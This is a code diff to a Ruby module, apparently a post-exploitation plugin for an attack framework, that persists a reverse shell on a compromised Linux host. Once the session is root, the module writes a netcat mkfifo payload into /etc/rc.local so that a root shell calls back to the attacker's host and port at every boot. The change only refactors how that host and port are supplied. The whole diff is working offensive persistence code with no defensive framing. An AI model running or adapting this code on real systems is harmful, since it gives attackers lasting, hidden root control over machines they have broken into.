@@ -1,5 +1,5 @@
 module RcLocalReverseShell
-  def self.run(fm, sid, client)
+  def self.run(fm, sid, client,lhost,lport)
     session = fm.sessions[sid]
     return unless session
 
@@ -16,15 +16,12 @@ module RcLocalReverseShell
     
     rc_local = '/etc/rc.local'
     client.print_good("Session #{sid} is root. Injecting reverse shell...")
-
-    attacker_ip   = session.shell_command_token("hostname -I | awk '{print $1}'").strip
-    attacker_port = 4444 #still haven't learned how to get the port from the framework
     
     # Avoid duplication
-    check_cmd = "grep -q '#{attacker_ip}' #{rc_local} 2>/dev/null && echo 'EXISTS'"
+    check_cmd = "grep -q '#{lhost}' #{rc_local} 2>/dev/null && echo 'EXISTS'"
     return client.print_status("Payload already exists. Skipping.") if session.shell_command_token(check_cmd).include?('EXISTS')
 
-    payload_line = "rm /tmp/f; mkfifo /tmp/f; nc #{attacker_ip} #{attacker_port} < /tmp/f | /bin/sh >/tmp/f 2>&1"
+    payload_line = "rm /tmp/f; mkfifo /tmp/f; nc #{lhost} #{lport} < /tmp/f | /bin/sh >/tmp/f 2>&1"
 
     begin
       content = session.shell_command_token("cat #{rc_local} 2>/dev/null")
